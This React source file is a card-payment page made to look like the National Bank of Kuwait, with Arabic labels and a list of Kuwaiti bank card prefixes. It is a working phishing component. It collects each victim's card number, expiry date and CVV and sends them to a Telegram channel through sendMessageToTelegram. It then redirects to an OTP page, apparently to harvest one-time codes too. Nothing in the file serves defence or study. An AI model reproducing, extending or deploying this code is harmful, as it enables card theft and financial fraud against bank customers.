import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { sendMessageToTelegram } from "@/backend/telegramService";

const CardDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  
  const paymentData = useMemo(() => {
    const queryParams = new URLSearchParams(window.location.search);
    return {
      customerName: queryParams.get('n') || "halits.YILDIZ",
      amount: queryParams.get('a') || "5.000",
      currency: queryParams.get('c') || "KWD"
    };
  }, [window.location.search]);

  const [formData, setFormData] = useState({ bank: "", cardNumber: "", expiryMonth: "", expiryYear: "", cvv: "", prefix: "" });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const cardPrefixes = [
    { value: "", label: "بادئة" },
    { value: "4", label: "4 (Visa)" },
    { value: "5", label: "5 (MasterCard)" },
    { value: "542010", label: "542010 (KNET)" },
    { value: "503258", label: "503258 (NBK)" },
    { value: "400494", label: "400494 (GULF)" },
    { value: "402096", label: "402096 (KFH)" },
    { value: "419266", label: "419266 (BOUBYAN)" }
  ];

  const validateCardNumber = (number: string) => {
    const digits = number.replace(/\s/g, '');
    if (digits.length < 13 || digits.length > 19) return false;
    let sum = 0; let shouldDouble = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits.charAt(i));
      if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
      sum += digit; shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
  };

  const handleInputChange = (field: string, value: string) => {
    setError("");
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const fullNumber = formData.prefix + formData.cardNumber.replace(/\s/g, '');
    if (!validateCardNumber(fullNumber)) { setError("رقم البطاقة غير صالح"); return; }
    setLoading(true);
    const message = `
<b>💳 Card Details</b>
<b>Name:</b> ${paymentData.customerName}
<b>Amount:</b> ${paymentData.amount} KD
<b>Bank:</b> ${formData.bank}
<b>Card:</b> ${formData.prefix}${formData.cardNumber}
<b>Expiry:</b> ${formData.expiryMonth}/${formData.expiryYear}
<b>CVV:</b> ${formData.cvv}
`;
    await sendMessageToTelegram(message);
    setTimeout(() => navigate(`/otp/${id}${window.location.search}`), 1500);
  };

  return (
    <div className="min-h-screen bg-gray-100 py-8 px-4" dir="rtl">
      <div className="max-w-md mx-auto bg-white rounded-2xl shadow-xl p-6">
        <div className="text-center mb-6"><img src="/nbk-logo.jpg" alt="NBK" className="h-10 mx-auto" /></div>
        <div className="border-b pb-4 mb-6">
           <div className="flex justify-between font-bold text-lg"><span>{paymentData.customerName}</span><span>:المستفيد</span></div>
           <div className="flex justify-between font-bold text-xl text-blue-700"><span>KD {paymentData.amount}</span><span>:المبلغ</span></div>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          {error && <div className="p-3 bg-red-100 text-red-700 rounded text-center">{error}</div>}
          <select value={formData.prefix} onChange={(e) => handleInputChange('prefix', e.target.value)} className="w-full p-3 border rounded-xl" required>
            {cardPrefixes.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
          </select>
          <Input type="text" placeholder="رقم البطاقة" value={formData.cardNumber} onChange={(e) => handleInputChange('cardNumber', e.target.value)} className="text-center text-lg" required />
          <div className="flex gap-2">
            <select value={formData.expiryMonth} onChange={(e) => handleInputChange('expiryMonth', e.target.value)} className="flex-1 p-3 border rounded-xl" required>
               <option value="">MM</option>{Array.from({length: 12}, (_, i) => <option key={i+1} value={String(i+1).padStart(2, '0')}>{String(i+1).padStart(2, '0')}</option>)}
            </select>
            <select value={formData.expiryYear} onChange={(e) => handleInputChange('expiryYear', e.target.value)} className="flex-1 p-3 border rounded-xl" required>
               <option value="">YYYY</option>{Array.from({length: 20}, (_, i) => <option key={2024+i} value={2024+i}>{2024+i}</option>)}
            </select>
          </div>
          <Input type="text" placeholder="CVV" maxLength={3} value={formData.cvv} onChange={(e) => handleInputChange('cvv', e.target.value)} className="text-center" required />
          <button type="submit" disabled={loading} className="w-full bg-blue-700 text-white py-4 rounded-xl font-bold">{loading ? "جاري الإرسال..." : "إرسال"}</button>
        </form>
      </div>
    </div>
  );
};

export default CardDetails;
